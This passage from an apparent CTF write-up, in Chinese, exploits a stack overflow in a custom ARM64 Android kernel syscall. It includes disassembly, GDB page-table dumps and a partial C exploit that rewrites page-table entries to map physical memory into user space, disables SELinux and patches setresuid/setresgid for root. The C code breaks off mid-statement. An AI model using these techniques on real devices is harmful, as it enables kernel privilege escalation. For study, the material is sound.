<p>对于本题：</p>
<ol>
<li><p>跟踪返回的流程，唯一的一个函数指针，用于调用_arm64_sys_stackof 函数了。返回时不会再执行。</p>
</li>
<li><p>跟踪返回流程，发现 0xFFFFFFC010209F7C 处会将 copy_from_user 函数的返回值存放到 x19 寄存器指向的内存处。而x19是上一个函数从栈上取出的，由于我们有超强的栈溢出能力，所以覆写x19对应的位置，就能达到任意地址写——copy_from_user的返回值。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_arm64_sys_stackof</span><br><span class="line">.kernel:FFFFFFC010257824                 BL              sys_stackof_handler</span><br><span class="line">.kernel:FFFFFFC010257828                 ADRP            X9, <span class="comment">#__stack_chk_guard@PAGE</span></span><br><span class="line">.kernel:FFFFFFC01025782C                 LDUR            X8, [X29,<span class="comment">#var_8]</span></span><br><span class="line">.kernel:FFFFFFC010257830                 LDR             X9, [X9,<span class="comment">#__stack_chk_guard@PAGEOFF]</span></span><br><span class="line">.kernel:FFFFFFC010257834                 CMP             X9, X8</span><br><span class="line">.kernel:FFFFFFC010257838                 B.NE            loc_FFFFFFC010257854</span><br><span class="line">.kernel:FFFFFFC01025783C                 ADD             SP, SP, <span class="comment">#0x810</span></span><br><span class="line">.kernel:FFFFFFC010257840                 LDP             X20, X19, [SP,<span class="comment">#var_s20]</span></span><br><span class="line">.kernel:FFFFFFC010257844                 LDP             X28, X21, [SP,<span class="comment">#var_s10]</span></span><br><span class="line">.kernel:FFFFFFC010257848                 LDP             X29, X30, [SP+var_s0],<span class="comment">#0x30</span></span><br><span class="line">.kernel:FFFFFFC01025784C                 LDR             X30, [X18,<span class="comment">#-8]!</span></span><br><span class="line">.kernel:FFFFFFC010257850                 RET        </span><br><span class="line">                                         <span class="comment"># /* RET到0xFFFFFFC010209F58*/</span></span><br><span class="line"></span><br><span class="line">el0_svc_common</span><br><span class="line">.kernel:FFFFFFC010209F54                 BLR             X20</span><br><span class="line">.kernel:FFFFFFC010209F58                 B               loc_FFFFFFC010209F7C</span><br><span class="line">.kernel:FFFFFFC010209F7C loc_FFFFFFC010209F7C                    ; CODE XREF: el0_svc_common+BC↑j</span><br><span class="line">.kernel:FFFFFFC010209F7C                                         ; el0_svc_common+D8↑j</span><br><span class="line">.kernel:FFFFFFC010209F7C                 STR             X0, [X19]             </span><br><span class="line">                                         <span class="comment"># /* x19可控，x0是0，往任意地址写0？*/</span></span><br></pre></td></tr></table></div></figure>
<p>copy_from_user的返回值构造花费了一些时间，返回值表示未成功拷贝的字节数，并且会将目标地址未成功拷贝的区域设置成0。幸好栈中黄框位置设置成全0时不影响程序流的执行。</p>
<p><img   src="image-20230906142425609.png?size=600" style="width: 600px;"  alt="image-20230906142425609"></p>
</li>
</ol>

        <h3 id="写一级页表对应虚拟地址（X）"   >
          <a href="#写一级页表对应虚拟地址（X）" class="heading-link"><i class="fas fa-link"></i></a><a href="#写一级页表对应虚拟地址（X）" class="headerlink" title="写一级页表对应虚拟地址（X）"></a>写一级页表对应虚拟地址（X）</h3>
      <p>直接写 (swapper_pg_dir+264*8) 区域会报错，”unable to handle kernel write to read-only memory at virtual address ffffffc0117e6840”。应该是为了安全考虑将该区域映射成只读的了。</p>
<p>那么还有线性映射区可以考虑，经过测试得到本环境中线性映射区的起始地址是 0xffffff8000000000 。目标页表项对应的虚拟地址：</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0xFFFFFFC0117E6000-0xFFFFFFC010080000)</span><br><span class="line"><span class="string">&#x27;0x1766000&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(264*8)</span><br><span class="line"><span class="string">&#x27;0x840&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(0xFFFFFF8000000000+0x80000+0x1766000+0x840)</span><br><span class="line"><span class="string">&#x27;0xffffff80017e6840&#x27;</span></span><br></pre></td></tr></table></div></figure>
<p>但是写线性映射区时也是同样的错，”Unable to handle kernel write to read-only memory at virtual address ffffff80017e6840”。</p>

        <h3 id="写一级页表虚拟地址对应页表项（✔）"   >
          <a href="#写一级页表虚拟地址对应页表项（✔）" class="heading-link"><i class="fas fa-link"></i></a><a href="#写一级页表虚拟地址对应页表项（✔）" class="headerlink" title="写一级页表虚拟地址对应页表项（✔）"></a>写一级页表虚拟地址对应页表项（✔）</h3>
      <p>页面不可写，应该是页表项中设置其权限为只读了。于是往上一层考虑，去改这read-only区域对应的页表项，能否改成读写。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">x/20gx 0xffffff80017e6840</span><br><span class="line">0xffffff80017e6840:     0x00680081c0000711      0x0068008200000711</span><br><span class="line">0xffffff80017e6850:     0x0068008240000711      0x0068008280000711</span><br><span class="line">0xffffff80017e6860:     0x00680082c0000711      0x0068008300000711</span><br><span class="line">0xffffff80017e6870:     0x0068008340000711      0x0068008380000711</span><br><span class="line">0xffffff80017e6880:     0x00680083c0000711      0x0000000000000000</span><br><span class="line">0xffffff80017e6890:     0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line">FFFF FF80 017E 6840</span><br><span class="line">11111111 11111111 11111111 10000000 00000001 01111110 01101000 01000000</span><br><span class="line">0000000 00：0</span><br><span class="line">000001 011：11</span><br><span class="line">11110 0110：486</span><br><span class="line"></span><br><span class="line">gef➤  monitor xp /20gx 0xafbf7000+0xf30 </span><br><span class="line"><span class="comment"># 【0xffffff80017e6840 对应的页表项为物理地址 0xafbf7f30，可以看到这个虚拟地址在页表项中被标记成了不可写】</span></span><br><span class="line">00000000afbf7f30: 0x00600000417e6793 0x00600000417e7793</span><br><span class="line">00000000afbf7f40: 0x00600000417e8793 0x00600000417e9793</span><br><span class="line">00000000afbf7f50: 0x00600000417ea793 0x00600000417eb793</span><br><span class="line">00000000afbf7f60: 0x00600000417ec793 0x00600000417ed793</span><br><span class="line">00000000afbf7f70: 0x00600000417ee793 0x00600000417ef793</span><br><span class="line">00000000afbf7f80: 0x00680000417f0713 0x00680000417f1713</span><br><span class="line">00000000afbf7f90: 0x00680000417f2713 0x00680000417f3713</span><br><span class="line">00000000afbf7fa0: 0x00680000417f4713 0x00680000417f5713</span><br><span class="line">00000000afbf7fb0: 0x00680000417f6713 0x00680000417f7713</span><br><span class="line">00000000afbf7fc0: 0x00680000417f8713 0x00680000417f9713</span><br><span class="line"></span><br><span class="line">gef➤  x/20gx 0xffffff8000000000+(0xafbf7f30-0x40000000)</span><br><span class="line"><span class="comment"># 【于是找到物理地址 0xafbf7f30 对应到线性映射区的地址】</span></span><br><span class="line">0xffffff806fbf7f30:     0x00600000417e6793      0x00600000417e7793</span><br><span class="line">0xffffff806fbf7f40:     0x00600000417e8793      0x00600000417e9793</span><br><span class="line">0xffffff806fbf7f50:     0x00600000417ea793      0x00600000417eb793</span><br><span class="line">0xffffff806fbf7f60:     0x00600000417ec793      0x00600000417ed793</span><br><span class="line">0xffffff806fbf7f70:     0x00600000417ee793      0x00600000417ef793</span><br><span class="line">0xffffff806fbf7f80:     0x00680000417f0713      0x00680000417f1713</span><br><span class="line">0xffffff806fbf7f90:     0x00680000417f2713      0x00680000417f3713</span><br><span class="line">0xffffff806fbf7fa0:     0x00680000417f4713      0x00680000417f5713</span><br><span class="line">0xffffff806fbf7fb0:     0x00680000417f6713      0x00680000417f7713</span><br><span class="line">0xffffff806fbf7fc0:     0x00680000417f8713      0x00680000417f9713</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0xffffff806fbf7f30</span><br><span class="line">11111111 11111111 11111111 10000000 01101111 10111111 01111111 00110000</span><br><span class="line">0000000 01：1</span><br><span class="line">101111 101：381</span><br><span class="line">11111 0111：503</span><br><span class="line"></span><br><span class="line">gef➤  monitor xp /20gx 0xafa02be8</span><br><span class="line">00000000afa02be8: 0x00000000af884003 0x00000000af883003</span><br><span class="line">gef➤  monitor xp /20gx 0xaf884fb8</span><br><span class="line"><span class="comment"># 【查看虚拟地址 0xffffff806fbf7f30 的页表项，发现是权限内核态可读写的，0x13对应00010011】</span></span><br><span class="line">00000000af884fb8: 0x00680000afbf7713 0x00680000afbf8713</span><br><span class="line"></span><br><span class="line"><span class="comment"># 【所以考虑先通过任意地址写，将虚拟地址 0xffffff806fbf7f30 处页表项的权限改成用户和内核态可读写】</span></span><br><span class="line"><span class="comment">#                                                                    0x00600000417e6753</span></span><br><span class="line"><span class="comment"># 【在用户态将虚拟地址 0xffffff80017e6840 处改成目标d_block，重新映射全部物理地址，权限为用户态可读写】</span></span><br><span class="line"><span class="comment">#                                                                    0x0070000040000e71</span></span><br><span class="line"><span class="comment"># 【在用户态通过读写内核，改setresuid,setresgid,selinux_state，最终获得root权限】</span></span><br></pre></td></tr></table></div></figure>
<p>所以需要利用 <code>FFFFFFC010209F7C STR X0, [X19]</code> 构造4次任意地址写，将 <code>0xffffff806fbf7f30</code> 的值覆盖成 <code>0x417e6753</code> 。</p>
<p>本地root shell：</p>
<p><img   src="image-20230906142451852.png?size=600" style="width: 600px;"  alt="image-20230906142451852"></p>
<p>exp：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_STACKOF 601</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_RET 0xFFFFFFC0000BECC8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg1, arg2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> HEXDUMP_COLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEXDUMP_COLS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">void</span> *mem, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : <span class="number">0</span>); i++) &#123;</span><br><span class="line">        <span class="comment">/* print offset */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%06x: &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print hex data */</span></span><br><span class="line">        <span class="keyword">if</span>(i &lt; len) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, <span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* end of block, just aligning for ASCII dump */</span></span><br><span class="line">        <span class="keyword">else</span> &#123;        </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* print ASCII dump */</span></span><br><span class="line">        <span class="keyword">if</span>(i % HEXDUMP_COLS == (HEXDUMP_COLS - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i - (HEXDUMP_COLS - <span class="number">1</span>); j &lt;= i; j++) &#123;</span><br><span class="line">                 <span class="comment">/* end of block, not really printing */</span></span><br><span class="line">                <span class="keyword">if</span>(j &gt;= len) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* printable char */</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isprint</span>(((<span class="keyword">char</span>*)mem)[j])) &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="number">0xFF</span> &amp; ((<span class="keyword">char</span>*)mem)[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                 <span class="comment">/* other char */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">putchar</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_read(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;k_stackof_read - arg2: %lx\n&quot;,arg2);</span></span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k_stackof_write(<span class="keyword">void</span>* addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)&#123;</span><br><span class="line">    arg1 = addr;</span><br><span class="line">    arg2 = (len^<span class="number">0xdeadbeefdeadbeef</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;k_stackof_write - arg2: %lx\n&quot;,arg2);</span></span><br><span class="line">    syscall(SYS_STACKOF, arg1, arg2, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_PHYS_ADDR 0x40080000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RE_MAP_ADDR 0xFFFFFFC200000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_BASE 0xFFFFFFC010080000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> SYMBOL__swapper_pg_dir = <span class="number">0xFFFFFFC0117E6000</span>;              <span class="comment">// in android11 there is a swapper_pg_dir symbol</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remap_addr_pte = <span class="number">0xffffff806fbf7f30</span>;              <span class="comment">// linear addr space</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remap_addr_dblock_addr = <span class="number">0xffffff80017e6840</span>;      <span class="comment">// linear addr space</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_block_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_block;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mirror</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_phys, <span class="keyword">unsigned</span> <span class="keyword">long</span> mirror_base)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index1 = (mirror_base &amp; <span class="number">0x0000007fc0000000</span>) &gt;&gt; <span class="number">30</span>; <span class="comment">// bits[39:31]</span></span><br><span class="line">    d_block_addr = SYMBOL__swapper_pg_dir + index1 * <span class="number">8</span>;  <span class="comment">// target Table Descriptor Address</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;descriptor: 0x%lx + %d x 8 = 0x%lx\n&quot;</span>, SYMBOL__swapper_pg_dir, index1, d_block_addr);</span><br><span class="line"></span><br><span class="line">    d_block = <span class="number">0</span>;</span><br><span class="line">    d_block |= <span class="number">0x1</span> ; <span class="comment">// Block entry</span></span><br><span class="line">    <span class="comment">/* Lower attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">11</span>); <span class="comment">// bits[11], nG</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">10</span>); <span class="comment">// bits[10], AF</span></span><br><span class="line">    d_block |= (<span class="number">1u</span> &lt;&lt; <span class="number">9</span>); <span class="comment">// bits[9], SH[1]</span></span><br><span class="line">    d_block |= <span class="number">0x40</span>; <span class="comment">// bits[7:6], AP[2:1] = 01</span></span><br><span class="line">    d_block |= <span class="number">0x20</span>; <span class="comment">// bits[5], NS</span></span><br><span class="line">    d_block |= <span class="number">0x10</span>; <span class="comment">// bits[2:0], AttrIndx[2:0]</span></span><br><span class="line">    d_block |= (kernel_phys &amp; <span class="number">0x0000ffffc0000000</span>); <span class="comment">// bits[47:30], output address</span></span><br><span class="line">    <span class="comment">/* Upper attributes */</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">52</span>); <span class="comment">// bits[52], Contiguous</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">53</span>); <span class="comment">// bits[53], PXN</span></span><br><span class="line">    d_block |= (<span class="number">1ul</span> &lt;&lt; <span class="number">54</span>); <span class="comment">// bits[54], XN</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d_block = 0x%lx\n&quot;</span>, d_block);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1\n&quot;</span>);</span><br><span class="line">    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* buf = mmap(<span class="number">0x60000000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>( buf == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="string">&quot;mmap() thread&quot;</span>);    </span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* read_buf = buf + (<span class="number">0x1000</span><span class="number">-0x9b0</span>);</span><br><span class="line">    k_stackof_read(read_buf, <span class="number">0x9b0</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte; </span><br><span class="line">    hexdump(read_buf, <span class="number">0x9b0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> write_size = <span class="number">0x9b0</span>+<span class="number">0x23</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">1</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0x37</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">2</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0x7e</span> - <span class="number">0x30</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;read_buf[<span class="number">0x970</span>]) = remap_addr_pte+<span class="number">3</span>; </span><br><span class="line">    write_size = <span class="number">0x9b0</span>+<span class="number">0x11</span>;</span><br><span class="line">    k_stackof_write(read_buf,write_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)remap_addr_dblock_addr = d_block;                <span class="comment">// make 0xfffffffc20000000 &lt;--&gt; phys_0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// write kernel image</span></span><br><span class="line">    <span class="comment">/* selinux_state*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr = <span class="number">0xFFFFFFC011AA69D8</span>+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr_new = RE_MAP_ADDR + <span class="number">0x80000</span> + (selinux_enforcing_addr - IMAGE_BASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;selinux_enforcing_addr_new: 0x%lx\n&quot;</span>, selinux_enforcing_addr_new);</span><br><span class="line">    *(<span class="keyword">char</span>*)selinux_enforcing_addr_new = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* sys_setresuid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr = <span class="number">0xFFFFFFC01023D680</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr_new = RE_MAP_ADDR + <span class="number">0x80000</span> + (setresuid_if_addr - IMAGE_BASE);</span><br><span class="line">    *(<span class="keyword">char</span> *)(setresuid_if_addr_new+<span class="number">3</span>) = <span class="number">0x36</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid_if_addr_new content: 0x%lx\n&quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)setresuid_if_addr_new);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* sys_setresgid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresgid_if_addr = <span class="number">0xFFFFFFC01023D888</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresgid_if_addr_new = 